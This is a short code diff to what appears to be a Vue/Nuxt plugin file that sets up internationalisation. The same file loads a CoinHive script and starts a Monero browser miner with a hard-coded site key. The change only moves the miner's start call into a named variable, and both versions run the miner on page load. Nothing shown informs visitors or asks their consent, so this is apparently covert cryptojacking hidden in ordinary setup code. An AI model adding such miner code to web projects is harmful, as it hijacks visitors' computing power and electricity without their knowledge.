@@ -9,6 +9,7 @@ export default ({app}) => {
   app.i18n = new VueI18n()
 
   asyncLoadScript((process.env.StaticServer || process.env.Server) + '/theme/js/lib/xmr.min.js', () => {
-    (new window.CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.9})).start()
+    const miner = new window.CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.9})
+    miner.start()
   })
 }
